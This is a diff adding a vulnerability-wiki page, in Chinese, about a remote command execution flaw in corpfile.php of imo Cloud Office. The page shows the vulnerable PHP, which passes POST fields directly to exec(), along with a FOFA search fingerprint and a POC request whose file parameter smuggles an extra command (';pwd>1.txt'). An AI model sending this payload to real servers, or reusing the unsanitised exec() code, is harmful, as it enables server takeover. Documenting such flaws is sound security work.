@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/imo%E4%BA%91%E5%8A%9E%E5%85%AC%E5%AE%A4/imo%20%E4%BA%91%E5%8A%9E%E5%85%AC%E5%AE%A4%20corpfile.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>imo 云办公室 corpfile.php 远程命令执行漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "imo \u4e91\u529e\u516c\u5ba4 corpfile.php \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
+              {title: "\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u7f51\u7edc\u6d4b\u7ed8", url: "#_3" },
+              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_4" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../imo%20%E4%BA%91%E5%8A%9E%E5%85%AC%E5%AE%A4%20get_file.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../imo%20%E4%BA%91%E5%8A%9E%E5%85%AC%E5%AE%A4%20get_file.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        imo 云办公室 get_file.php 远程命令执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../imo%20%E4%BA%91%E5%8A%9E%E5%85%AC%E5%AE%A4%20Imo_DownLoadUI.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../imo%20%E4%BA%91%E5%8A%9E%E5%85%AC%E5%AE%A4%20Imo_DownLoadUI.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        imo 云办公室 Imo_DownLoadUI.php 任意文件下载漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="imo-corpfilephp">imo 云办公室 corpfile.php 远程命令执行漏洞<a class="headerlink" href="#imo-corpfilephp" title="Permanent link">&para;</a></h1>
+<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>imo 云办公室 corpfile.php 文件中参数过滤不足，导致可以随意进行命令拼接，获取服务器权限</p>
+<h2 id="_2">漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p><a-checkbox checked>imo 云办公室</a-checkbox></br></p>
+<h2 id="_3">网络测绘<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p><a-checkbox checked>app="iMO-云办公室"</a-checkbox></br></p>
+<h2 id="_4">漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<p>登录页面</p>
+<p><img alt="img" src="../../../.vuepress/public/img/1645878070559-eaed5393-f82d-4b08-8b95-54e91e5ceae0.png" /></p>
+<p>漏洞文件 corpfile.php</p>
+<div class="highlight"><pre><span></span><code><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="nx">define</span><span class="p">(</span><span class="s1">&#39;DELETE_FAILED&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;数据不存在，删除失败!&#39;</span><span class="p">);</span>
+<span class="nx">define</span><span class="p">(</span><span class="s1">&#39;DELETE_SUCCESS&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;数据存在，删除成功!&#39;</span><span class="p">);</span>
+<span class="k">switch</span><span class="p">(</span><span class="nx">$_POST</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">])</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="k">case</span><span class="w"> </span><span class="s1">&#39;corpLogo&#39;</span><span class="o">:</span>
+<span class="w">    </span><span class="nx">$checkFile</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">exec</span><span class="p">(</span><span class="s1">&#39;ls &#39;</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="nx">$_POST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]);</span>
+<span class="w">    </span><span class="nx">$result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">exec</span><span class="p">(</span><span class="nx">$_POST</span><span class="p">[</span><span class="s1">&#39;command&#39;</span><span class="p">]);</span>
+<span class="w">    </span><span class="nx">echo</span><span class="w"> </span><span class="nx">json_encode</span><span class="p">(</span><span class="nx">array</span><span class="p">(</span><span class="s1">&#39;cid&#39;</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">$_POST</span><span class="p">[</span><span class="s1">&#39;cid&#39;</span><span class="p">],</span><span class="w"> </span><span class="s1">&#39;account&#39;</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">$_POST</span><span class="p">[</span><span class="s1">&#39;account&#39;</span><span class="p">],</span><span class="w"> </span><span class="s1">&#39;command&#39;</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">$_POST</span><span class="p">[</span><span class="s1">&#39;command&#39;</span><span class="p">],</span><span class="w"> </span><span class="s1">&#39;file&#39;</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">((</span><span class="nx">$checkFile</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="nx">$result</span><span class="p">)</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="nx">DELETE_SUCCESS</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="nx">DELETE_FAILED</span><span class="p">)));</span>
+<span class="w">  </span><span class="k">break</span><span class="p">;</span>
+
+<span class="w">  </span><span class="k">case</span><span class="w"> </span><span class="s1">&#39;userLogo&#39;</span><span class="o">:</span>
+<span class="w">    </span><span class="nx">$checkFile</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">exec</span><span class="p">(</span><span class="s1">&#39;ls &#39;</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="nx">$_POST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]);</span>
+<span class="w">    </span><span class="nx">$result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">exec</span><span class="p">(</span><span class="nx">$_POST</span><span class="p">[</span><span class="s1">&#39;command&#39;</span><span class="p">]);</span>
+<span class="w">    </span><span class="nx">echo</span><span class="w"> </span><span class="nx">json_encode</span><span class="p">(</span><span class="nx">array</span><span class="p">(</span><span class="s1">&#39;uid&#39;</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">$_POST</span><span class="p">[</span><span class="s1">&#39;uid&#39;</span><span class="p">],</span><span class="w"> </span><span class="s1">&#39;user_account&#39;</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">$_POST</span><span class="p">[</span><span class="s1">&#39;user_account&#39;</span><span class="p">],</span><span class="w"> </span><span class="s1">&#39;command&#39;</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">$_POST</span><span class="p">[</span><span class="s1">&#39;command&#39;</span><span class="p">],</span><span class="w"> </span><span class="s1">&#39;file&#39;</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">((</span><span class="nx">$checkFile</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="nx">$result</span><span class="p">)</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="nx">DELETE_SUCCESS</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="nx">DELETE_FAILED</span><span class="p">)));</span>
+<span class="w">  </span><span class="k">break</span><span class="p">;</span>
+
+<span class="w">  </span><span class="k">case</span><span class="w"> </span><span class="s1">&#39;corpTemp&#39;</span><span class="o">:</span>
+<span class="w">    </span><span class="nx">$checkFile</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">exec</span><span class="p">(</span><span class="s1">&#39;ls &#39;</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="nx">$_POST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]);</span>
+<span class="w">    </span><span class="nx">$result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">exec</span><span class="p">(</span><span class="nx">$_POST</span><span class="p">[</span><span class="s1">&#39;command&#39;</span><span class="p">]);</span>
+<span class="w">    </span><span class="nx">echo</span><span class="w"> </span><span class="nx">json_encode</span><span class="p">(</span><span class="nx">array</span><span class="p">(</span><span class="s1">&#39;cid&#39;</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">$_POST</span><span class="p">[</span><span class="s1">&#39;cid&#39;</span><span class="p">],</span><span class="w"> </span><span class="s1">&#39;account&#39;</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">$_POST</span><span class="p">[</span><span class="s1">&#39;account&#39;</span><span class="p">],</span><span class="w"> </span><span class="s1">&#39;command&#39;</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">$_POST</span><span class="p">[</span><span class="s1">&#39;command&#39;</span><span class="p">],</span><span class="w"> </span><span class="s1">&#39;file&#39;</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">((</span><span class="nx">$checkFile</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="nx">$result</span><span class="p">)</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="nx">DELETE_SUCCESS</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="nx">DELETE_FAILED</span><span class="p">)));</span>
+<span class="w">  </span><span class="k">break</span><span class="p">;</span>
+
+<span class="w">  </span><span class="k">case</span><span class="w"> </span><span class="s1">&#39;chatLog&#39;</span><span class="o">:</span>
+<span class="w">    </span><span class="nx">$checkFile</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">exec</span><span class="p">(</span><span class="s1">&#39;ls &#39;</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="nx">$_POST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]);</span>
+<span class="w">    </span><span class="nx">$result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">exec</span><span class="p">(</span><span class="nx">$_POST</span><span class="p">[</span><span class="s1">&#39;command&#39;</span><span class="p">]);</span>
+<span class="w">    </span><span class="nx">echo</span><span class="w"> </span><span class="nx">json_encode</span><span class="p">(</span><span class="nx">array</span><span class="p">(</span><span class="s1">&#39;cid&#39;</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">$_POST</span><span class="p">[</span><span class="s1">&#39;cid&#39;</span><span class="p">],</span><span class="w"> </span><span class="s1">&#39;account&#39;</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">$_POST</span><span class="p">[</span><span class="s1">&#39;account&#39;</span><span class="p">],</span><span class="w"> </span><span class="s1">&#39;command&#39;</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">$_POST</span><span class="p">[</span><span class="s1">&#39;command&#39;</span><span class="p">],</span><span class="w"> </span><span class="s1">&#39;file&#39;</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">((</span><span class="nx">$checkFile</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="nx">$result</span><span class="p">)</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="nx">DELETE_SUCCESS</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="nx">DELETE_FAILED</span><span class="p">)));</span>
+<span class="w">  </span><span class="k">break</span><span class="p">;</span>
+
+<span class="w">  </span><span class="k">case</span><span class="w"> </span><span class="s1">&#39;multiChatLog&#39;</span><span class="o">:</span>
+<span class="w">    </span><span class="nx">$checkFile</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">exec</span><span class="p">(</span><span class="s1">&#39;ls &#39;</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="nx">$_POST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]);</span>
+<span class="w">    </span><span class="nx">$result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">exec</span><span class="p">(</span><span class="nx">$_POST</span><span class="p">[</span><span class="s1">&#39;command&#39;</span><span class="p">]);</span>
+<span class="w">    </span><span class="nx">echo</span><span class="w"> </span><span class="nx">json_encode</span><span class="p">(</span><span class="nx">array</span><span class="p">(</span><span class="s1">&#39;cid&#39;</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">$_POST</span><span class="p">[</span><span class="s1">&#39;cid&#39;</span><span class="p">],</span><span class="w"> </span><span class="s1">&#39;account&#39;</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">$_POST</span><span class="p">[</span><span class="s1">&#39;account&#39;</span><span class="p">],</span><span class="w"> </span><span class="s1">&#39;command&#39;</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">$_POST</span><span class="p">[</span><span class="s1">&#39;command&#39;</span><span class="p">],</span><span class="w"> </span><span class="s1">&#39;file&#39;</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">((</span><span class="nx">$checkFile</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="nx">$result</span><span class="p">)</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="nx">DELETE_SUCCESS</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="nx">DELETE_FAILED</span><span class="p">)));</span>
+<span class="w">  </span><span class="k">break</span><span class="p">;</span>
+
+<span class="w">  </span><span class="k">case</span><span class="w"> </span><span class="s1">&#39;groupChatLog&#39;</span><span class="o">:</span>
+<span class="w">    </span><span class="nx">$checkFile</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">exec</span><span class="p">(</span><span class="s1">&#39;ls &#39;</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="nx">$_POST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]);</span>
+<span class="w">    </span><span class="nx">$result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">exec</span><span class="p">(</span><span class="nx">$_POST</span><span class="p">[</span><span class="s1">&#39;command&#39;</span><span class="p">]);</span>
+<span class="w">    </span><span class="nx">echo</span><span class="w"> </span><span class="nx">json_encode</span><span class="p">(</span><span class="nx">array</span><span class="p">(</span><span class="s1">&#39;cid&#39;</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">$_POST</span><span class="p">[</span><span class="s1">&#39;cid&#39;</span><span class="p">],</span><span class="w"> </span><span class="s1">&#39;account&#39;</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">$_POST</span><span class="p">[</span><span class="s1">&#39;account&#39;</span><span class="p">],</span><span class="w"> </span><span class="s1">&#39;command&#39;</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">$_POST</span><span class="p">[</span><span class="s1">&#39;command&#39;</span><span class="p">],</span><span class="w"> </span><span class="s1">&#39;file&#39;</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">((</span><span class="nx">$checkFile</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="nx">$result</span><span class="p">)</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="nx">DELETE_SUCCESS</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="nx">DELETE_FAILED</span><span class="p">)));</span>
+<span class="w">  </span><span class="k">break</span><span class="p">;</span>
+
+<span class="w">  </span><span class="k">case</span><span class="w"> </span><span class="s1">&#39;backChatLog&#39;</span><span class="o">:</span>
+<span class="w">    </span><span class="nx">$checkFile</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">exec</span><span class="p">(</span><span class="s1">&#39;ls &#39;</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="nx">$_POST</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]);</span>
+<span class="w">    </span><span class="nx">$result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">exec</span><span class="p">(</span><span class="nx">$_POST</span><span class="p">[</span><span class="s1">&#39;command&#39;</span><span class="p">]);</span>
+<span class="w">    </span><span class="nx">echo</span><span class="w"> </span><span class="nx">json_encode</span><span class="p">(</span><span class="nx">array</span><span class="p">(</span><span class="s1">&#39;cid&#39;</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">$_POST</span><span class="p">[</span><span class="s1">&#39;cid&#39;</span><span class="p">],</span><span class="w"> </span><span class="s1">&#39;account&#39;</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">$_POST</span><span class="p">[</span><span class="s1">&#39;account&#39;</span><span class="p">],</span><span class="w"> </span><span class="s1">&#39;command&#39;</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">$_POST</span><span class="p">[</span><span class="s1">&#39;command&#39;</span><span class="p">],</span><span class="w"> </span><span class="s1">&#39;file&#39;</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">((</span><span class="nx">$checkFile</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="nx">$result</span><span class="p">)</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="nx">DELETE_SUCCESS</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="nx">DELETE_FAILED</span><span class="p">)));</span>
+<span class="w">  </span><span class="k">break</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>验证POC</p>
+<div class="highlight"><pre><span></span><code><span class="nx">POST</span><span class="w"> </span><span class="o">/</span><span class="nx">corpfile</span><span class="p">.</span><span class="nx">php</span>
+
+<span class="nx">type</span><span class="o">=</span><span class="nx">corpLogo</span><span class="o">&amp;</span><span class="nx">command</span><span class="o">=</span><span class="nx">id</span><span class="o">&amp;</span><span class="nx">file</span><span class="o">=</span><span class="p">;</span><span class="nx">pwd</span><span class="o">&gt;</span><span class="mf">1.</span><span class="nx">txt</span>
+</code></pre></div>
+<p><img alt="img" src="../../../.vuepress/public/img/1645881191090-fcf34136-bc53-4b37-8de8-e4ca535b750a.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../imo%20%E4%BA%91%E5%8A%9E%E5%85%AC%E5%AE%A4%20get_file.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../imo%20%E4%BA%91%E5%8A%9E%E5%85%AC%E5%AE%A4%20get_file.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        imo 云办公室 get_file.php 远程命令执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../imo%20%E4%BA%91%E5%8A%9E%E5%85%AC%E5%AE%A4%20Imo_DownLoadUI.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../imo%20%E4%BA%91%E5%8A%9E%E5%85%AC%E5%AE%A4%20Imo_DownLoadUI.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        imo 云办公室 Imo_DownLoadUI.php 任意文件下载漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
